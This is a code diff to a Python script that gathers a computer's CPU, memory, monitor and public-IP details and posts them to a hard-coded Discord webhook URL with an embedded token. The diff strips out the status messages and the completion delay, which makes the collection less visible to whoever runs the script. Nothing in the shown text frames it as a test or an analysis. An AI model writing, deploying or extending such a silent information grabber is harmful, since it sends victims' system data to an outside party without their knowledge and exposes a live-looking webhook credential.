@@ -5,15 +5,13 @@ from cpuinfo import get_cpu_info
 import psutil
 from screeninfo import get_monitors
 import subprocess
-import time
 
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1320641725034926133/l1Y2_9bYYvtluQR4Io67E96ubDUT_x9wGDOHHtYz0GifdZOfGNq0Su2AqPji3ttuIWj8"
 
 def get_public_ip():
     try:
-        print("Fetching public IP...")
-        response = requests.get("https://api.ipify.org?format=json", timeout=10)  # Timeout added
+        response = requests.get("https://api.ipify.org?format=json")
         response.raise_for_status()
         return response.json().get("ip")
     except requests.RequestException as e:
@@ -88,9 +86,8 @@ def send_to_discord(machine_info, public_ip):
             content += f"{key}: {value}\n"
         content += f"**Public IP:** {public_ip}"
         payload = {"content": content}
-        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)  # Timeout added
+        response = requests.post(WEBHOOK_URL, json=payload)
         response.raise_for_status()
-        print("Information sent successfully to Discord.")
     except requests.RequestException as e:
         print(f"Failed to send to Discord: {e}")
 
@@ -98,5 +95,4 @@ if __name__ == "__main__":
     public_ip = get_public_ip()
     machine_info = get_machine_info()
     send_to_discord(machine_info, public_ip)
-    time.sleep(2)  # Delay added to show completion message
-    exit()  # Ensure the program exits after completion
+    exit()
